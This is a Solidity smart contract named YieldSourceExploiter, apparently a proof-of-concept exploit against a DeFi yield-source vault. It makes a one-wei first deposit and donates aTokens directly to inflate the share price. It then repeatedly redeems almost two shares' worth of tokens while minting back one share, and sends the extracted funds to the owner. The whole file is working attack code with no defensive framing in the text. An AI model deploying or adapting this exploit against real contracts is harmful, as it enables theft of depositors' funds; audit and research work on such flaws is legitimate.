// SPDX-License-Identifier: GPL-3.0

pragma solidity 0.8.10;

import { IERC20 } from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import { IYieldSource } from "./IYieldSource.sol";


//This contract will handle deposit and transfer (to require that the transfer only goes through if it leads to a very high share price)
//and then handle the actual iteration loop.
contract YieldSourceExploiter   {
    address internal owner;
    IYieldSource internal yieldSource;
    IERC20 internal aToken;
    IERC20 internal usdcToken;

    uint256 constant USDC_DECIMAL = 1e6;

    constructor(address _owner, address _yieldSource, IERC20 _aToken, IERC20 _usdcToken)   {
        owner = _owner;
        yieldSource = IYieldSource(_yieldSource);
        aToken = _aToken;
        usdcToken = _usdcToken;
        _usdcToken.approve(_yieldSource, type(uint256).max);
        _aToken.approve(_yieldSource, type(uint256).max);
    }

    modifier onlyOwner   {
        require(msg.sender == owner);
        _;
    }

    //Before calling this, ensure that the YieldSourceExploiter has been transferred 1 usdcToken and initDeposit aToken.
    function firstDeposit(uint256 initDeposit) external onlyOwner   {
        //Require that there are currently no shares--ensures we don't waste init deposit
        require(yieldSource.totalSupply() == 0);

        //Deposit 1 wei to get 1 share
        yieldSource.supplyTokenTo(1, address(this));

        //Deposit initDeposit to rack up share price
        aToken.transfer(address(yieldSource), initDeposit);
    }

    function iterateExploit(uint256 iterations) external onlyOwner   {
        //For numIterations:
        for (uint256 i = 0; i != iterations; i++)   {
            //Burn 1.99 shares
            uint256 pricePerShare = (aToken.balanceOf(address(yieldSource)) * 1e6) / yieldSource.totalSupply();
            uint256 goodRedeemAmount = (pricePerShare * 2) - 1;
            yieldSource.redeemToken(goodRedeemAmount);

            if (i != iterations - 1)   {
                // Mint 1 share. We're passing in too many tokens here (due to price change caused by operation above), 
                // but so long as it's not 2x too many (which it's not) it doesn't affect anything.
                yieldSource.supplyTokenTo(pricePerShare, address(this));
            }
        }
    }

    function withdrawFunds() external onlyOwner   {
        //Withdraw all funds
        uint256 aBalance = aToken.balanceOf(address(this));
        if (aBalance != 0)   {
            aToken.transfer(msg.sender, aBalance);
        }

        uint256 usdcBalance = usdcToken.balanceOf(address(this));
        if (usdcBalance != 0)   {
            usdcToken.transfer(msg.sender, usdcBalance);
        }
    }
}